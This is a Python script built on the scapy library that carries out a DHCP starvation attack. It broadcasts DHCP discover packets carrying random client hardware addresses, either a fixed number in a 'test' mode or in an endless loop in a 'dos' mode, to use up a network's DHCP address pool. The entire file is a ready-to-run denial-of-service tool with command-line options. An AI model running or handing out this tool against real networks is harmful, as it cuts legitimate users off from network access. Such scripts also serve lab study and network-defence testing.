#!/usr/bin/python3

from scapy.all import *
import sys
import argparse
from colorama import Fore

global GREEN, RED, YELLOW, MAGENTA, RESET
GREEN = Fore. GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW
MAGENTA = Fore.MAGENTA
RESET = Fore.RESET



conf.checkIpAddr = False # To stop scapy from checking return packet originating from any packet that we have sent out

def dhcp_starvation(attack, num_req):
    src_ip = "0.0.0.0" # host needs to not have an IP address
    dest_ip = "255.255.255.255" # broadcast
    src_mac = RandMAC() # we randomize src mac
    dest_mac = "FF:FF:FF:FF:FF:FF" # broadcast

    if attack == "test":
        print(GREEN + "[+] send "+str(num_req)+" DHCP packets (message type: discover)" + RESET)
        for i in range(0,num_req):
            dhcp_request = Ether(src=src_mac, dst=dest_mac)/IP(src=src_ip, dst=dest_ip)/UDP(sport=68, dport=67)/BOOTP(chaddr=RandString(12, b'0123456789abcdef'))/DHCP(options=[("message-type", "discover"),"end"])
            sendp(dhcp_request, verbose=False, iface=net_interface)

    elif attack == "dos":
        print(GREEN + "[+] send continuously DHCP packets (message type: discover)" + RESET)
        while True:
            dhcp_request = Ether(src=src_mac, dst=dest_mac)/IP(src=src_ip, dst=dest_ip)/UDP(sport=68, dport=67)/BOOTP(chaddr=RandString(12, b'0123456789abcdef'))/DHCP(options=[("message-type","discover"),"end"])
            sendp(dhcp_request, verbose=False, iface=net_interface)

    return True



parser = argparse.ArgumentParser()
parser.add_argument("-t", "--type", help="test/flood")
parser.add_argument("-N", "--num_req", help="number of request")
parser.add_argument("-I", "--interface", help="interface(eth0, ...)")
args = parser.parse_args()

if args.type:
    type_attack = args.type

    if type_attack == "test":
        if args.num_req:
            num_request = int(args.num_req)
        else:
            num_request = 5
    else:
        num_request = 0 # means infinity of requests

global net_interface
if args.interface:
    net_interface = args.interface
else:
    net_interface = "eth0"

dhcp_starvation(type_attack, num_request)

sys.exit(1)
